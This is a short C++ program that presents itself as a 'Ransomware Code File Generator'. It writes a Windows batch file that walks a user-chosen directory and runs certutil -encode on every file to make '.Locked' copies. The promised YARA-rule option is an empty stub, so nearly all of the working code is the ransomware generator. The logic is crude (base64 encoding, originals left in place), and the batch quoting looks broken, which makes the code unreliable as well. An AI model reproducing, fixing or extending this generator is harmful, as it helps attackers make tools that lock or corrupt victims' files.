#include <iostream>
#include <fstream>
using namespace std;

void RansomGenerator()
{
   // ofstream MyFile("Ransomware.txt");
   // Create and open a text file
  ofstream MyFile("Ransomware.bat");
string path;
string ignor="";
cout<<"Enter Path:"<<endl;
cin>>path;
  // Write to the file
  MyFile << "@echo off"<<endl;
MyFile << "cls"<<endl;
MyFile << "Title Ransoware"<<endl;
MyFile << "Cd /d ";
MyFile <<path<<endl;
MyFile << "Cd /"<<endl;
MyFile << "For /F "<<ignor<<"""tokens*"""<<ignor<<"%%A in ('dir /b/s')do("<<endl;
MyFile <<"certutil -encode "<<"%%~A" <<"%%nA.Locked)"<<endl;
MyFile <<"pause>nul";
  // Close the file
  MyFile.close();
     cout << "Check the generated file in xyz repo" << endl;

}

void YaraRule(){}
int main() {
  // Create and open a text file
  cout<<"===================================================="<<endl;
  cout<<"===================================================="<<endl;
  cout<<"\tRansomware Code File Generator"<<endl;
  cout<<"===================================================="<<endl;
  cout<<"===================================================="<<endl;

  cout<<endl<<endl;

  int choice;
cout<<"1=> Generate Ransomware file"<<endl;
cout<<"2=> Generate Yara rule"<<endl;
cout<<"Enter your choice"<<endl;
cin>>choice;

if(choice==1)
{
    RansomGenerator();
}
else 
 YaraRule();
cout<<endl;
system("pause");
}